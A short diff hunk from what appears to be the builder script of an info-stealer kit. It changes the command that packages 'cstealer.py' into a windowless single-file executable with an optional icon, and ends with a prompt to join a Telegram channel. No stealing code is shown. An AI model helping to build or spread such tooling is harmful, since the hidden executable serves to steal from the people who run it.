@@ -64,7 +64,7 @@ def build_exe():
 
         # Customizing PyInstaller build command
         dist_path = os.path.join(os.getcwd(), "dist")
-        build_command = f'pyinstaller cstealer.py --noconsole --onefile{icon_option}'
+        build_command = f'python -m PyInstaller cstealer.py --noconsole --onefile{icon_option}'
         os.system(build_command)
 
         messagebox.showinfo("Build Success", "Build process completed successfully.\nDon't forget to star the repo and join Telegram channel to support and receive lastest updates!")
